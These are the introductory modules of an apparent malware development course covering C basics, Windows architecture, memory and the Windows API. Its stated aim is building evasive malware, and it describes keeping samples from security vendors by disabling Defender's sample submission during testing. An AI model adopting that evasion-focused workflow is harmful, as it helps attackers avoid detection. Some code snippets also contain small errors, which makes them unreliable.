# 1.1 Introduction to Malware Development

### What is Malware?

Malware is a type of software specifically designed to perform malicious actions such as gaining unauthorized access to a machine or stealing sensitive data from a machine. The term "malware" is often associated with illegal or criminal conduct but it can also be used by ethical hackers such as penetration testers and red teamers for an authorized security assessment of an organization.

MalDev Academy assumes that users enrolled in this course will use the knowledge learned for ethical and legal purposes only. Any other uses can result in criminal charges and MalDev Academy will not be responsible for this.

### Why Learn Malware Development?

There are several reasons why someone would want to learn malware development. From an offensive security perspective, testers will often need to perform certain malicious tasks against a client's environment. Testers generally have three main options when it comes to the types of tools used in an engagement:

1. Open-Source Tools (OSTs) - These tools are generally signatured by security vendors and detected in any decently protected or mature organization. They are not always reliable when engaging in an offensive security assessment.

2. Purchasing Tools - Teams with larger budgets will often opt to purchase tools in order to save valuable time during engagements. Similar to custom tools, these are generally closed-source and have a better chance of evading security solutions.

3. Developing Custom Tools - Because these tools are custom-built, they have not been analyzed or signatured by security vendors which gives the attacking team an advantage when it comes to detection. This is where malware development knowledge becomes paramount for a more successful offensive security assessment.


### What Programming Language Should Be Used?

Technically speaking any programming language can be used to build malware such as Python, PowerShell, C#, C, C++ and Go. With that being said, there are a few reasons that some programming languages prevail over others when it comes to malware development and it usually boils down to the following points:

- Certain programming languages are more difficult to reverse engineer. It should always be a part of the attacker's goal to ensure defenders have limited understanding as to how the malware behaves

- Some programming languages require prerequisites on the target system. For example, executing a Python script requires an interpreter present on the target machine. Without the Python interpreter present on the machine, it is impossible to execute Python-based malware.

- Depending on the programming language the generated file size will differ.


### High-level vs Low-level Programming Languages

Programming languages can be classified into two different groups, high-level and low-level.

- High-level - Generally more abstracted from the operating system, less efficient with memory and provides the developer with less overall control due to the abstraction of several complex functions. An example of a high-level programming language is Python.

- Low-Level - Provides a way to interact with the operating system at an intimate level and provides the developer more freedom when interacting with the system. An example of a low-level programming language is C.


Given the previous explanations, it should become clear why low-level programming languages have been the preferred choice in malware development, especially when targeting Windows machines.

### Windows Malware Development

The Windows malware development scene has shifted within the past few years and is now highly focused on evading host-based security solutions such as Antivirus (AV) and Endpoint Detection and Response (EDR). With the advancement in technology, it is no longer sufficient to build malware that executes suspicious commands or performs "malware-like" actions.

MalDev Academy will teach you to build evasive malware that can be used in real engagements. The modules will also call out??[non-opsec](https://redteam.guide/docs/definitions/#:~:text=OPSEC%20or%20Operational%20Security%20is,that%20eliminate%20or%20reduce%20adversary)??actions or actions that will likely have your malware detected by security solutions or blue teams.

### Malware Development Life Cycle

Fundamentally, malware is a piece of software designed to perform certain actions. Successful software implementations require a process that's known as the Software Development Life Cycle (SDLC). Similarly, a well-built and complex malware will require a tailored version of the SDLC referred to as the Malware Development Life Cycle (MDLC).

Although the MDLC is not necessarily a formalized process, it is used in MalDev Academy to give the readers an easy way to understand the development process. The MDLC consists of 5 main stages:

1. Development - Begin the development or refinement of functionality within the malware.

2. Testing - Perform tests to uncover hidden bugs within the so-far developed code.

3. Offline AV/EDR Testing - Run the developed malware against as many security products as possible. It's important that the testing is conducted offline to ensure no samples are sent to the security vendors. Using Microsoft Defender, this is achieved by disabling the automated sample submissions & cloud-delivered protection option.

4. Online AV/EDR Testing - Run the developed malware against the security products with internet connectivity. Cloud engines are often key components in AVs/EDRs and therefore testing your malware against these components is crucial to gain more accurate results. Be cautious as this step may result in samples being sent to the security solution's cloud engine.

5. IoC (Indicators of Compromise) Analysis - In this stage, you become the threat hunter or malware analyst. Analyze the malware and pull out IoCs that can potentially be used to detect or signature the malware.

6. Return to step 1.
# 1.2 Coding Basics

### Introduction

As previously mentioned, this course requires a fundamental understanding of C as a prerequisite. With that being said, there are a few concepts that will be mentioned due to their importance throughout this course.

### Structures

Structures or Structs are user-defined data types that allow the programmer to group related data items of different data types into a single unit. Structs can be used to store data related to a particular object. Structs help organize large amounts of related data in a way that can be easily accessed and manipulated. Each item within a struct is called a "member" or "element", these terms are used interchangeably within the course.

A common occurrence one will see when working with the Windows API is that some APIs require a populated structure as input, while others will take a declared structure and populate it. Below is an example of the??`THREADENTRY32`??struct, it is not necessary to understand what the members are used for at this point.

```c
typedef struct tagTHREADENTRY32 {
  DWORD dwSize; // Member 1
  DWORD cntUsage; // Member 2
  DWORD th32ThreadID;
  DWORD th32OwnerProcessID;
  LONG  tpBasePri;
  LONG  tpDeltaPri;
  DWORD dwFlags;
} THREADENTRY32; 
```

#### Declaring a Structure

Structures used in this course are generally declared with the use of??`typedef`??keyword to give a structure an alias. For example, the structure below is created with the name??`_STRUCTURE_NAME`??but??`typedef`??adds two other names,??`STRUCTURE_NAME`??and??`*PSTRUCTURE_NAME`.

```c
typedef struct _STRUCTURE_NAME {

  // structure elements

} STRUCTURE_NAME, *PSTRUCTURE_NAME;
```

The??`STRUCTURE_NAME`??alias refers to the structure name, whereas??`PSTRUCTURE_NAME`??represents a pointer to that structure. Microsoft generally uses the??`P`??prefix to indicate a pointer type.

#### Initializing a Structure

Initializing a structure will vary depending on whether one is initializing the actual structure type or a pointer to the structure. Continuing the previous example, initializing a structure is the same when using??`_STRUCTURE_NAME`??or??`STRUCTURE_NAME`, as shown below.

```c
STRUCTURE_NAME    struct1 = { 0 };  // The '{ 0 }' part, is used to initialize all the elements of struct1 to zero
// OR
_STRUCTURE_NAME   struct2 = { 0 };  // The '{ 0 }' part, is used to initialize all the elements of struct2 to zero
```

This is different when initializing the structure pointer,??`PSTRUCTURE_NAME`.

```c
PSTRUCTURE_NAME structpointer = NULL;
```

#### Initializing and Accessing Structures Members

A structure's members can be initialized either directly through the structure or indirectly through a pointer to the structure. In the example below, the structure??`struct1`??has two members,??`ID`??and??`Age`, initialized directly via the dot operator (`.`).

```c
typedef struct _STRUCTURE_NAME {
  int ID;
  int Age;
} STRUCTURE_NAME, *PSTRUCTURE_NAME;

STRUCTURE_NAME struct1 = { 0 }; // initialize all elements of struct1 to zero
struct1.ID   = 1470;   // initialize the ID element
struct1.Age  = 34;     // initialize the Age element
```

Another way to initialize the members is using??_designated initializer syntax_??where one can specify which members of the structure to initialize.

```c
typedef struct _STRUCTURE_NAME {
  int ID;
  int Age;
} STRUCTURE_NAME, *PSTRUCTURE_NAME;

STRUCTURE_NAME struct1 = { .ID   = 1470,  .Age  = 34}; // initialize both the ID and the Age elements
```

On the other hand, accessing and initializing a structure through its pointer is done via the arrow operator (`->`).

```c
typedef struct _STRUCTURE_NAME {
  int ID;
  int Age;
} STRUCTURE_NAME, *PSTRUCTURE_NAME;

STRUCTURE_NAME struct1 = { .ID   = 1470,  .Age  = 34};

PSTRUCTURE_NAME structpointer = &struct1; // structpointer is a pointer to the 'struct1' structure

// Updating the ID member
structpointer->ID = 8765;
printf("The structure's ID member is now : %d \n", structpointer->ID);
```

The arrow operator can be converted into dot format. For example,??`structpointer->ID`??is equivalent to??`(*structpointer).ID`. That is,??`structurepointer`??is de-referenced and then accessed directly.

### Enumeration

The enum or enumeration data type is used to define a set of named constants. To create an enumeration, the??`enum`??keyword is used, followed by the name of the enumeration and a list of identifiers, each of which represents a named constant. The compiler automatically assigns values to the constants, starting with 0 and increasing by 1 for each subsequent constant. In this course, enums can be seen representing the state of specific data, error codes or return values.

An example of an enum is the list of "Weekdays" which contains 7 constants. In the example below, Monday has a value of 0, Tuesday has a value of 1, and so on. It's important to note that enum lists cannot be modified or accessed using the dot (.) operator. Instead, each element is accessed directly using its named constant value.

```c
enum Weekdays {
  Monday,         // 0
  Tuesday,        // 1
  Wednesday,      // 2
  Thursday,       // 3
  Friday,         // 4
  Saturday,       // 5
  Sunday          // 6
};

// Defining a "Weekdays" enum variable 
enum Weekdays EnumName = Friday;       // 4

// Check the value of "EnumName"
switch (EnumName){
    case Monday:
      printf("Today Is Monday !\n");
      break;
    case Tuesday:
      printf("Today Is Tuesday !\n");
      break;
    case Wednesday:
      printf("Today Is Wednesday !\n");
      break;
    case Thursday:
      printf("Today Is Thursday !\n");
      break;
    case Friday:
      printf("Today Is Friday !\n");
      break;
    case Saturday:
      printf("Today Is Saturday !\n");
      break;
    case Sunday:
      printf("Today Is Sunday !\n");
      break;
    default:
      break;
}
```

### Union

In the C programming language, a??[Union](https://learn.microsoft.com/en-us/cpp/cpp/unions?view=msvc-170)??is a data type that permits the storage of various data types in the same memory location. Unions provide an efficient way to use a single memory location for multiple purposes. Unions are not commonly used but can be seen in Windows-defined structures. The code below illustrates how to define a union in C:

```c
union ExampleUnion {
   int    IntegerVar;
   char   CharVar;
   float  FloatVar;
};
```

`ExampleUnion`??can store??`char`,??`int`??and??`float`??data types in the same memory location. To access the members of a union in C, one can use the dot operator, similar to that used for structures.

It's important to note that in a union, assigning a new value to any member will change the value of all other members as well because they share the same memory location to store their data. Additionally, the memory allocated for a union is equal to the size of its largest member.

### Bitwise Operators

Bitwise operators are operators that manipulate the individual bits of a binary value, performing operations on each corresponding bit position. The bitwise operators are shown below:

- Right shift (`>>`)

- Left shift (`<<`)

- Bitwise OR (`|`)

- Bitwise AND (`&`)

- Bitwise XOR (`^`)

- Bitwise NOT (`~`)


#### Right and Left Shift

The right shift (`>>`) and left shift (`<<`) operators are used to shift the bits of a binary number to the right and left by a specified number of positions, respectively.

Shifting right discards the rightmost number of bits by the specified value and zero bits of the same amount are inserted into the left. For example, the image below shows??`10100111`??shifted right by??`2`, to become??`00101001`.

![image](https://user-images.githubusercontent.com/111295429/233790472-9782abea-7104-4f8f-b927-5ee0e74e8424.png)

On the other hand, shifting left discards the leftmost bits and the same number of zero bits are inserted from the right handside. For example, the image below shows??`10100111`??shifted left by??`2`, to become??`10011100`.

![image](https://user-images.githubusercontent.com/111295429/233791839-6d230e61-7f27-43f3-95a2-dbd1ead75b6f.png)

#### Bitwise OR

The bitwise OR operation is a logical operation that involves two binary values at the bit level. It evaluates each bit of the first operand against the corresponding bit of the second operand, generating a new binary value. The new binary value contains a 1 in any bit position where either one or both of the corresponding bits in the original values are 1.

The following table represents the bitwise OR output with all the possible input bits.

![image](https://user-images.githubusercontent.com/111295429/233792537-7fe6b3df-a217-4a7a-bae8-a20e1c86be0f.png)

#### Bitwise AND

The bitwise AND operation is a logical operation that involves two binary values at the bit level. This operation sets the bits of the new binary value to 1 only in the case where the corresponding bits of both input operands are 1.

The following table represents the bitwise AND output with all the possible input bits.

![image](https://user-images.githubusercontent.com/111295429/233792744-d6e10278-323c-48f0-8740-7f2ad579a71c.png)

#### Bitwise XOR

The bitwise XOR operation (also known as exclusive OR) is a logical operation that involves two binary values at the bit level. If only one of the bits is 1, the result in each position is 1. Conversely, if both bits are 0 or 1, the output is 0.

The following table represents the bitwise XOR output with all the possible input bits.

![image](https://user-images.githubusercontent.com/111295429/233793118-743398f2-e21c-441c-bb79-a80fe7876719.png)

#### Bitwise NOT

The bitwise NOT operation takes one binary number and flips all its bits. In other words, it changes all 0s to 1s and all 1s to 0s. The following table represents the bitwise XOR output with all the possible input bits.

![image](https://user-images.githubusercontent.com/111295429/233794817-82f48b9f-8770-413c-b4e3-b16697adcac6.png)

### Passing By Value

Passing by value is a method of passing arguments to a function where the argument is a copy of the object's value. This means that when an argument is passed by value, the value of the object is copied and the function can only modify its local copy of the object's value, not the original object itself.

```c
int add(int a, int b)
{
   int result = a + b;
   return result;
}

int main()
{
   int x = 5;
   int y = 10;
   int sum = add(x, y); // x and y are passed by value

   return 0;
}
```

### Passing By Reference

Passing by reference is a method of passing arguments to a function where the argument is a pointer to the object, rather than a copy of the object's value. This means that when an argument is passed by reference, the memory address of the object is passed instead of the value of the object. The function can then access and modify the object directly, without creating a local copy of the object.

```c
void add(int *a, int *b, int *result)
{
  
  int A = *a; // A is now the same value of a passed in from the main function
  int B = *b; // B is now the same value of b passed in from the main function
  
  *result = B + A;
}

int main()
{
   int x = 5;
   int y = 10;
   int sum = 0;

   add(&x, &y, &sum);
  
   // 'sum' now is 15
   
   return 0;
}
```
# 1.3 Windows Architecture

### Introduction

This module explains the Windows architecture and what happens under the hood of Windows processes and applications.

### Windows Architecture

A processor inside a machine running the Windows operating system can operate under two different modes: User Mode and Kernel Mode. Applications run in user mode, and operating system components run in kernel mode. When an application wants to accomplish a task, such as creating a file, it cannot do so on its own. The only entity that can complete the task is the kernel, so instead applications must follow a specific function call flow. The diagram below shows a high level of this flow.

![Windows-Architecture](https://maldevacademy.s3.amazonaws.com/images/Basic/4-windows-architecture/arch-diagram.png)

1. **User Processes**??- A program/application executed by the user such as Notepad, Google Chrome or Microsoft Word.

2. **Subsystem DLLs**??- DLLs that contain API functions that are called by user processes. An example of this would be??`kernel32.dll`??exporting the??[CreateFile](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)??Windows API (WinAPI) function, other common subsystem DLLs are??`ntdll.dll`,??`advapi32.dll`, and??`user32.dll`.

3. **Ntdll.dll**??- A system-wide DLL which is the lowest layer available in user mode. This is a special DLL that creates the transition from user mode to kernel mode. This is often referred to as the Native API or NTAPI.

4. **Executive Kernel**??- This is what is known as the Windows Kernel and it calls other drivers and modules available within kernel mode to complete tasks. The Windows kernel is partially stored in a file called??`ntoskrnl.exe`??under "C:\Windows\System32".


### Function Call Flow

The image below shows an example of an application that creates a file. It begins with the user application calling the??`CreateFile`??WinAPI function which is available in??`kernel32.dll`.??`Kernel32.dll`??is a critical DLL that exposes applications to the WinAPI and is therefore can be seen loaded by most applications. Next,??`CreateFile`??calls its equivalent NTAPI function,??`NtCreateFile`, which is provided through??`ntdll.dll`.??`Ntdll.dll`??then executes an assembly??`sysenter`??(x86) or??`syscall`??(x64) instruction, which transfers execution to kernel mode. The kernel??`NtCreateFile`??function is then used which calls kernel drivers and modules to perform the requested task.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/windows-arch-flow.png)

### Function Call Flow Example

This example shows the function call flow happening through a debugger. This is done by attaching a debugger to a binary that creates a file via the??`CreateFileW`??Windows API.

The user application calls the??`CreateFileW`??WinAPI.

![CreateFileW](https://maldevacademy.s3.amazonaws.com/images/Basic/createfilew-dbg.png)

Next,??`CreateFileW`??calls its equivalent NTAPI function,??`NtCreateFile`.

![NtCreateFile](https://maldevacademy.s3.amazonaws.com/images/Basic/ntcreatefile-dbg.png)

Finally, the??`NtCreateFile`??function uses a??`syscall`??assembly instruction to transition from user mode to kernel mode. The kernel will then be the one that creates the file.

![Syscall](https://maldevacademy.s3.amazonaws.com/images/Basic/syscall.png)

### Directly Invoking The Native API (NTAPI)

It's important to note that applications can invoke syscalls (i.e. NTDLL functions) directly without having to go through the Windows API. The Windows API simply acts as a wrapper for the Native API. With that being said, the Native API is more difficult to use because it is not officially documented by Microsoft. Furthermore, Microsoft advises against the use of Native API functions because they can be changed at any time without warning.

Future modules will explore the benefits of directly invoking the Native API.
# 1.4 Windows Memory Management

### Introduction

This module goes through the fundamentals of Windows memory. Understanding how Windows handles memory is crucial to building advanced malware.

### Virtual Memory & Paging

Memory in modern operating systems is not mapped directly to physical memory (i.e the RAM). Instead, virtual memory addresses are used by processes that are mapped to physical memory addresses. There are several reasons for this but ultimately the goal is to save as much physical memory as possible. Virtual memory may be mapped to physical memory but can also be stored on disk. With virtual memory addressing it becomes possible for multiple processes to share the same physical address while having a unique virtual memory address. Virtual memory relies on the concept of??_Memory paging_??which divides memory into chunks of 4kb called "pages".

See the image below from the??[Windows Internals 7th edition - part 1](https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals)??book.

![Virtual-Mem](https://maldevacademy.s3.amazonaws.com/images/Basic/5-windows-memory-management/virtual-memory.png)

### Page State

The pages residing within a process's virtual address space can be in one of 3 states:

1. **Free**??- The page is neither committed nor reserved. The page is not accessible to the process. It is available to be reserved, committed, or simultaneously reserved and committed. Attempting to read from or write to a free page can result in an access violation exception.

2. **Reserved**??- The page has been reserved for future use. The range of addresses cannot be used by other allocation functions. The page is not accessible and has no physical storage associated with it. It is available to be committed.

3. **Committed**??- Memory charges have been allocated from the overall size of RAM and paging files on disk. The page is accessible and access is controlled by one of the memory protection constants. The system initializes and loads each committed page into physical memory only during the first attempt to read or write to that page. When the process terminates, the system releases the storage for committed pages.


### Page Protection Options

Once the pages are committed, they need to have their protection option set. The list of memory protection constants can be found??[here](https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)??but some examples are listed below.

- `PAGE_NOACCESS`??- Disables all access to the committed region of pages. An attempt to read from, write to or execute the committed region will result in an access violation.

- `PAGE_EXECUTE_READWRITE`??- Enables Read, Write and Execute. This is highly discouraged from being used and is generally an IoC because it's uncommon for memory to be both writable and executable at the same time.

- `PAGE_READONLY`??- Enables read-only access to the committed region of pages. An attempt to write to the committed region results in an access violation.


### Memory Protection

Modern operating systems generally have built-in memory protections to thwart exploits and attacks. These are also important to keep in mind as they will likely be encountered when building or debugging the malware.

- **Data Execution Prevention (DEP)**??- DEP is a system-level memory protection feature that is built into the operating system starting with Windows XP and Windows Server 2003. If the page protection option is set to PAGE_READONLY, then DEP will prevent code from executing in that memory region.
    
- **Address space layout randomization (ASLR)**??- ASLR is a memory protection technique used to prevent the exploitation of memory corruption vulnerabilities. ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.
    

### x86 vs x64 Memory Space

When working with Windows processes, it's important to note whether the process is x86 or x64. x86 processes have a smaller memory space of 4GB (`0xFFFFFFFF`) whereas x64 has a vastly larger memory space of 128TB (`0xFFFFFFFFFFFFFFFF`).

### Allocating Memory Example

This example goes through small code snippets to better understand how one can interact with Windows memory via C functions and Windows APIs. The first step in interacting with memory is allocating memory. The snippet below demonstrates several ways to allocate memory which is essentially reserving a memory inside the running process.

```c
// Allocating a memory buffer of *100* bytes

// Method 1 - Using malloc()
PVOID pAddress = malloc(100);

// Method 2 - Using HeapAlloc()
PVOID pAddress = HeapAlloc(GetProcessHeap(), 0, 100);

// Method 3 - Using LocalAlloc()
PVOID pAddress = LocalAlloc(LPTR, 100);
```

Memory allocation functions return the??_base address_??which is simply a pointer to the beginning of the memory block that was allocated. Using the snippets above,??`pAddress`??will be the base address of the memory block that was allocated. Using this pointer several actions can be taken such as reading, writing, and executing. The type of actions that can be performed will depend on the protection assigned to the allocated memory region.

The image below shows what??`pAddress`??looks like under the debugger.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/memory-mgmt-105290746-d5fa58f7-b3d7-4064-98b8-6f7ee5dcc12d.png)

```c
#include <Windows.h>
#include <stdio.h>

int main() {
	PVOID pAddress = HeapAlloc(GetProcessHeap(), 0, 100);

	printf("[+] Base Address of Allocated Memory: 0x%p \n", pAddress);

	printf("[#] Press <Enter> to Quit...");
	getchar();

	return 0;
}
```

When memory is allocated, it may either be empty or contain random data. Some memory allocation functions provide an option to zero out the memory region during the allocation process.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/memory-mgmt-205290946-31ab4c35-b0e6-4727-9d45-8e439453207d.png)

### Writing To Memory Example

The next step after memory allocation is generally writing to that buffer. Several options can be used to write to memory but for this example,??`memcpy`??is used.

```c
PVOID pAddress	= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);

CHAR* cString	= "MalDev Academy Is The Best";

memcpy(pAddress, cString, strlen(cString));
```

```c
#include <Windows.h>
#include <stdio.h>

int main() {
	PVOID pAddress	= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);

	CHAR* cString	= "MalDev Academy Is The Best";
	
	memcpy(pAddress, cString, strlen(cString));

	printf("[+] Base Address of Allocated Memory: 0x%p \n", pAddress);

	printf("[#] Press <Enter> to Quit...");
	getchar();

	return 0;
}
```
`HeapAlloc`??uses the??`HEAP_ZERO_MEMORY`??flag which causes the allocated memory to be initialized to zero. The string is then copied to the allocated memory using??`memcpy`. The last parameter in??`memcpy`??is the number of bytes to be copied. Next, recheck the buffer to verify that the data was successfully written.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/memory-mgmt-305293097-6334290e-3d79-4254-9a79-cd7011ca4bbc.png)

### Freeing Allocated Memory

When the application is done using an allocated buffer, it is highly recommended to deallocate or free the buffer to avoid??[memory leaks](https://en.wikipedia.org/wiki/Memory_leak).

Depending on what function was used to allocate memory, it will have a corresponding memory deallocation function. For example:

- Allocating with??`malloc`??requires the use of the??`free`??function.

- Allocating with??`HeapAlloc`??requires the use of the??`HeapFree`??function.

- Allocating with??`LocalAlloc`??requires the use of the??`LocalFree`??function.

```c
#include <Windows.h>
#include <stdio.h>

int main() {
	PVOID pAddress	= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);

	CHAR* cString	= "MalDev Academy Is The Best";
	
	memcpy(pAddress, cString, strlen(cString));

	printf("[+] Base Address of Allocated Memory: 0x%p \n", pAddress);

	printf("[#] Press <Enter> to Quit...");
	getchar();

	HeapFree(GetProcessHeap(), 0, pAddress)
	return 0;
}
```

The images below show??`HeapFree`??in action, freeing allocated memory at address??`0000023ADE449900`. Notice the address??`0000023ADE449900`??still exists within the process but its original content was overwritten with random data. This new data is most likely due to a new allocation performed by the OS inside the process.

![IMAGE](https://maldevacademy.s3.amazonaws.com/images/Basic/memory-mgmt-424394866-a0dead3a-b72b-4600-8003-b8ecc2a27449.png)

![IMAGE](https://maldevacademy.s3.amazonaws.com/images/Basic/memory-mgmt-524394895-7c747075-d866-4ca8-a15f-09cb4fec7e6d.png)
# 1.5 Introduction To The Windows API

### Introduction

The Windows API provides developers with a way for their applications to interact with the Windows operating system. For example, if the application needs to display something on the screen, modify a file or query the registry all of these actions can be done via the Windows API. The Windows API is very well documented by Microsoft and can be viewed??[here](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list).

### Windows Data Types

The Windows API has many data types outside of the well-known ones (e.g. int, float). The data types are documented and can be viewed??[here](https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types).

Some of the common data types are listed below:

- `DWORD`??- A 32-bit unsigned integer, on both 32-bit and 64-bit systems, used to represent values from 0 up to (2^32 - 1).

```c
DWORD dwVariable = 42;
```

- `size_t`??- Used to represent the size of an object. It's a 32-bit unsigned integer on 32-bit systems representing values from 0 up to (2^32 - 1). On the other hand, it's a 64-bit unsigned integer on 64-bit systems representing values from 0 up to (2^64 - 1).

```c
SIZE_T sVariable = sizeof(int);
```

- `VOID`??- Indicates the absence of a specific data type.

```c
void* pVariable = NULL; // This is the same as PVOID
```

- `PVOID`??- A 32-bit or 4-byte pointer of any data type on 32-bit systems. Alternatively, a 64-bit or 8-byte pointer of any data type on 64-bit systems.

```c
PVOID pVariable = &SomeData;
```

- `HANDLE`??- A value that specifies a particular object that the operating system is managing (e.g. file, process, thread).

```c
HANDLE hFile = CreateFile(...);
```

- `HMODULE`??- A handle to a module. This is the base address of the module in memory. An example of a MODULE can be a DLL or EXE file.

```c
HMODULE hModule = GetModuleHandle(...);
```

- `LPCSTR/PCSTR`??- A pointer to a constant null-terminated string of 8-bit Windows characters (ANSI). The "L" stands for "long" which is derived from the 16-bit Windows programming period, nowadays it doesn't affect the data type, but the naming convention still exists. The "C" stands for "constant" or read-only variable. Both these data types are equivalent to??`const char*`.

```c
LPCSTR  lpcString   = "Hello, world!";
PCSTR   pcString    = "Hello, world!";
```

- `LPSTR/PSTR`??- The same as??`LPCSTR`??and??`PCSTR`, the only difference is that??`LPSTR`??and??`PSTR`??do not point to a constant variable, and instead point to a readable and writable string. Both these data types are equivalent to??`char*`.

```c
LPSTR   lpString    = "Hello, world!";
PSTR    pString     = "Hello, world!";
```

- `LPCWSTR\PCWSTR`??- A pointer to a constant null-terminated string of 16-bit Windows Unicode characters (Unicode). Both these data types are equivalent to??`const wchar*`.

```c
LPCWSTR     lpwcString  = L"Hello, world!";
PCWSTR      pcwString   = L"Hello, world!";
```

- `PWSTR\LPWSTR`??- The same as??`LPCWSTR`??and??`PCWSTR`, the only difference is that 'PWSTR' and 'LPWSTR' do not point to a constant variable, and instead point to a readable and writable string. Both these data types are equivalent to??`wchar*`.

```c
LPWSTR  lpwString   = L"Hello, world!";
PWSTR   pwString    = L"Hello, world!";
```

- `wchar_t`??- The same as??`wchar`??which is used to represent wide characters.

```c
wchar_t     wChar           = L'A';
wchar_t*    wcString        = L"Hello, world!";
```

- `ULONG_PTR`??- Represents an unsigned integer that is the same size as a pointer on the specified architecture, meaning on 32-bit systems a??`ULONG_PTR`??will be 32 bits in size, and on 64-bit systems, it will be 64 bits in size. Throughout this course,??`ULONG_PTR`??will be used in the manipulation of arithmetic expressions containing pointers (e.g. PVOID). Before executing any arithmetic operation, a pointer will be subjected to type-casting to??`ULONG_PTR`. This approach is used to avoid direct manipulation of pointers which can lead to compilation errors.

```c
PVOID Pointer = malloc(100);
// Pointer = Pointer + 10; // not allowed
Pointer = (ULONG_PTR)Pointer + 10; // allowed
```

### Data Types Pointers

The Windows API allows a developer to declare a data type directly or a pointer to the data type. This is reflected in the data type names where the data types that start with "P" represent pointers to the actual data type while the ones that don't start with "P" represent the actual data type itself.

This will become useful later when working with Windows APIs that have parameters that are pointers to a data type. The examples below show how the "P" data type relates to its non-pointer equivalent.

- `PHANDLE`??is the same as??`HANDLE*`.
    
- `PSIZE_T`??is the same as??`SIZE_T*`.
    
- `PDWORD`??is the same as??`DWORD*`.
    

### ANSI & Unicode Functions

The majority of Windows API functions have two versions ending with either "A" or with "W". For example, there is??[CreateFileA](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)??and??[CreateFileW](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew). The functions ending with "A" are meant to indicate "ANSI" whereas the functions ending with "W" represent Unicode or "Wide".

The main difference to keep in mind is that the ANSI functions will take in ANSI data types as parameters, where applicable, whereas the Unicode functions will take in Unicode data types. For example, the first parameter for??`CreateFileA`??is an??`LPCSTR`, which is a pointer to a constant null-terminated string of??**8-bit**??Windows ANSI characters. On the other hand, the first parameter for??`CreateFileW`??is??`LPCWSTR`, a pointer to a constant null-terminated string of??**16-bit**??Unicode characters.

Furthermore, the number of required bytes will differ depending on which version is used.

`char str1[] = "maldev";`??// 7 bytes (maldev +??[null byte](https://www.tutorialandexample.com/null-character-in-c)).

`wchar str2[] = L"maldev";`??// 14 bytes, each character is 2 bytes (The null byte is also 2 bytes)

### In and Out Parameters

Windows APIs have??[in](https://learn.microsoft.com/en-us/windows/win32/midl/in)??and??[out](https://learn.microsoft.com/en-us/windows/win32/midl/out-idl)??parameters. An??`IN`??parameter is a parameter that is passed into a function and is used for input. Whereas an??`OUT`??parameter is a parameter used to return a value back to the caller of the function. Output parameters are often passed in by reference through pointers.

For example, the code snippet below shows a function??`HackTheWorld`??which takes in an integer pointer and sets the value to??`123`. This is considered an out parameter since the parameter is returning a value.

```c
BOOL HackTheWorld(OUT int* num){

    // Setting the value of num to 123
    *num = 123;
    
    // Returning a boolean value
    return TRUE;
}

int main(){
    int a = 0;

    // 'HackTheWorld' will return true
    // 'a' will contain the value 123
    HackTheWorld(&a);
}
```

Keep in mind that the use of the??`OUT`??or??`IN`??keywords is meant to make it easier for developers to understand what the function expects and what it does with these parameters. However, it is worth mentioning that excluding these keywords does not affect whether the parameter is considered an output or input parameter.

### Windows API Example

Now that the fundamentals of the Windows API have been laid out, this section will go through the usage of the??`CreateFileW`??function.

#### Find the API Reference

It's important to always reference the documentation if one is unsure about what the function does or what arguments it requires. Always read the description of the function and assess whether the function accomplishes the desired task. The??`CreateFileW`??documentation is available??[here](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew).

#### Analyze Return Type & Parameters

The next step would be to view the parameters of the function along with the return data type. The documentation states??_If the function succeeds, the return value is an open handle to the specified file, device, named pipe, or mail slot_??therefore??`CreateFileW`??returns a??`HANDLE`??data type to the specified item that's created.

Furthermore, notice that the function parameters are all??`in`??parameters. This means the function does not return any data from the parameters since they are all??`in`??parameters. Keep in mind that the keywords within the square brackets, such as??`in`,??`out`, and??`optional`, are purely for developers' reference and do not have any actual impact.

```c
HANDLE CreateFileW(
  [in]           LPCWSTR               lpFileName,
  [in]           DWORD                 dwDesiredAccess,
  [in]           DWORD                 dwShareMode,
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [in]           DWORD                 dwCreationDisposition,
  [in]           DWORD                 dwFlagsAndAttributes,
  [in, optional] HANDLE                hTemplateFile
);
```

#### Use The Function

The sample code below goes through an example usage of??`CreateFileW`. It will create a text file with the name??`maldev.txt`??on the current user's Desktop.

```c
// This is needed to store the handle to the file object
// the 'INVALID_HANDLE_VALUE' is just to intialize the variable
HANDLE hFile = INVALID_HANDLE_VALUE; 

// The full path of the file to create.
// Double backslashes are required to escape the single backslash character in C
// Make sure the username (maldevacademy) exists, otherwise modify it
LPCWSTR filePath = L"C:\\Users\\maldevacademy\\Desktop\\maldev.txt";

// Call CreateFileW with the file path
// The additional parameters are directly from the documentation
hFile = CreateFileW(filePath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

// On failure CreateFileW returns INVALID_HANDLE_VALUE
// GetLastError() is another Windows API that retrieves the error code of the previously executed WinAPI function
if (hFile == INVALID_HANDLE_VALUE){
    printf("[-] CreateFileW Api Function Failed With Error : %d\n", GetLastError());
    return -1;
}
```

### Windows API Debugging Errors

When functions fail they often return a non-verbose error. For example, if??`CreateFileW`??fails it returns??`INVALID_HANDLE_VALUE`??which indicates that a file could not be created. To gain more insight as to why the file couldn't be created, the error code must be retrieved using the??[GetLastError](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror)??function.

Once the code is retrieved, it needs to be looked up in??[Windows's System Error Codes List](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-). Some common error codes are translated below:

- `5`??- ERROR_ACCESS_DENIED
    
- `2`??- ERROR_FILE_NOT_FOUND
    
